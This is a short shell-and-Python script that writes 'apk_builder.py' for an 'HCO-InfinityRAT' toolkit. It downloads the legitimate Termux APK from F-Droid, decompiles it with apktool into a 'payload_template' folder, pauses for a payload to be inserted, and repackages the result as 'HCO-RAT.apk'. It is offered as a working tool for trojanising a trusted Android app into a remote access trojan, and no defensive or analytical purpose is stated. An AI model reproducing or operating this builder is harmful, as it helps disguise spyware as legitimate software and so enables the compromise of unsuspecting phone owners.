cat > apk_builder.py <<'EOF'
# apk_builder.py
import os, requests, shutil, subprocess, time

BASE_APK_URL = "https://f-droid.org/repo/com.termux_118.apk"
LOCAL_BASE_APK = "base_apk/base.apk"
TARGET_BASE_APK = "base.apk"

def ensure_base_apk():
    if os.path.exists(TARGET_BASE_APK):
        print("[✓] base.apk already exists."); return
    if os.path.exists(LOCAL_BASE_APK):
        print("[+] Copying default base.apk..."); shutil.copy(LOCAL_BASE_APK, TARGET_BASE_APK); return
    print("[+] Downloading base.apk..."); r = requests.get(BASE_APK_URL, stream=True)
    with open(TARGET_BASE_APK, 'wb') as f: shutil.copyfileobj(r.raw, f)
    print("[✓] base.apk downloaded.")

def run_apktool_commands():
    print("[+] Decoding base.apk..."); subprocess.run(["apktool","d",TARGET_BASE_APK,"-o","payload_template","--force-all"])
    input("⚙️ Edit payload in payload_template/ and press Enter to continue…")
    print("[+] Rebuilding APK…"); subprocess.run(["apktool","b","payload_template","-o","HCO-RAT.apk"])
    print("[✓] APK built: HCO-RAT.apk")

def main():
    print("=== HCO‑InfinityRAT APK Builder ==="); time.sleep(1)
    ensure_base_apk(); run_apktool_commands()

if __name__ == "__main__":
    main()
EOF
